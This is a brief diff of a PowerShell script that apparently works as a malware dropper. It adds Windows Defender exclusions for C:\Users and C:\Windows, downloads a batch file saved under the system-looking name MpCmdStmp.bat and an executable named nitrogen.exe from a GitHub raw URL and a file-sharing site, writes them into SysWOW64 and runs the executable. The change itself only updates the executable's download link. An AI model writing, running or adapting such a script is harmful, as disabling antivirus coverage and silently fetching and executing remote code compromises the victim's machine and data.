@@ -2,7 +2,7 @@ Add-MpPreference -ExclusionPath "C:\Users"
 Add-MpPreference -ExclusionPath "C:\Windows"
 
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/setup.bat' -OutFile 'C:\Windows\SysWOW64\MpCmdStmp.bat'
-Invoke-WebRequest -Uri 'https://www.upload.ee/download/16727921/07b4f65a9d0c1eec113a/nitrogen.exe' -OutFile 'C:\Windows\SysWOW64\nitrogen.exe'
+Invoke-WebRequest -Uri 'https://www.upload.ee/download/16727921/37abebe653bf1eec1e48/nitrogen.exe' -OutFile 'C:\Windows\SysWOW64\nitrogen.exe'
 cd C:\Windows\SysWOW64
 .\nitrogen.exe
 
